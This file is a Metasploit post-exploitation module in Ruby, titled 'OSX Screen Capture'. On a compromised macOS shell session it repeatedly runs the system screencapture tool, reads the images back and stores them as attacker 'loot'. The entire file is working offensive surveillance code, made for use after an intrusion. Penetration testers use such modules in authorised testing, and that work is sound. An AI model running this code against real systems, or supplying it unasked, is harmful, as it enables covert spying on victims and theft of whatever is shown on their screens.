##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'OSX Screen Capture',
        'Description'   => %q{
          This module takes screenshots of target desktop and automatically downloads them.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'Peter Toth <globetother[at]gmail.com>' # ported windows version to osx
          ],
        'Platform'      => [ 'osx' ],
        'SessionTypes'  => [ 'shell' ]
      ))

    register_options(
      [
        OptEnum.new('FILETYPE',
          [true, 'File format to use when saving a snapshot', 'png', %w(png gif)]
        ),
        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds. 0 for no delay', 10]),
        OptInt.new('COUNT', [true, 'Number of screenshots to collect.', 1]),
        OptString.new('TMP_PATH', [true, 'Path to remote temp directory', '/tmp/random']),
        OptString.new('EXE_PATH', [true, 'Path to remote screencapture executable', '/usr/sbin/screencapture'])
      ], self.class)

  end

  def run
    file_type = datastore['FILETYPE'].shellescape
    tmp_path = datastore['TMP_PATH'].shellescape.gsub('random', Rex::Text.rand_text_alpha(8))

    count = datastore['COUNT']
    print_status "Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds"
    # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits
    leading_zeros = Math::log10(count).round
    file_locations = []
    count.times do |num|
      Rex.sleep(datastore['DELAY'])
      begin
        # This is an OSX module, so mkdir -p should be fine
        cmd_exec("mkdir -p #{tmp_path}")
        filename = Rex::Text.rand_text_alpha(7)
        file = tmp_path + "/" + filename
        cmd_exec(datastore['EXE_PATH'].shellescape + " -C -t " + datastore['FILETYPE'].shellescape + " " + file)
        data = read_file(file)
      rescue RequestError => e
        print_error("Error taking the screenshot: #{e.class} #{e} #{e.backtrace}")
        return false
      end
      if data
        begin
          # let's loot it using non-clobbering filename, even tho this is the source filename, not dest
          fn = "screenshot.%0#{leading_zeros}d.#{file_type}" % num
          file_locations << store_loot("screen_capture.screenshot", "image/#{file_type}", session, data, fn, "Screenshot")
        rescue IOError, Errno::ENOENT => e
          print_error("Error storing screenshot: #{e.class} #{e} #{e.backtrace}")
          return false
        end
      end
    end
    print_status("Screen Capturing Complete")
    if file_locations and not file_locations.empty?
      print_status "run loot -t screen_capture.screenshot to see file locations of your newly acquired loot"
    end
  end
end
